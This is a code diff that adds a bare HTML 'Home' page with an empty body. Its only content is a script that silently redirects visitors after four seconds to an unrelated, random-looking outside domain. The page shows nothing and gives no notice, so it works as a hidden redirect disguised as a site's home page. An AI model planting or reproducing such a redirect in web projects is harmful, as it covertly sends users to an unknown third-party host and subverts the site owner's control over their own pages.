@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Home</title>
+  <script>
+    // JavaScript code for redirecting after a delay
+    setTimeout(function() {
+      window.location.href = 'https://ougoaxee.net/4/6844487';
+    }, 4000);
+  </script>
+</head>
+<body>
+</body>
+</html>
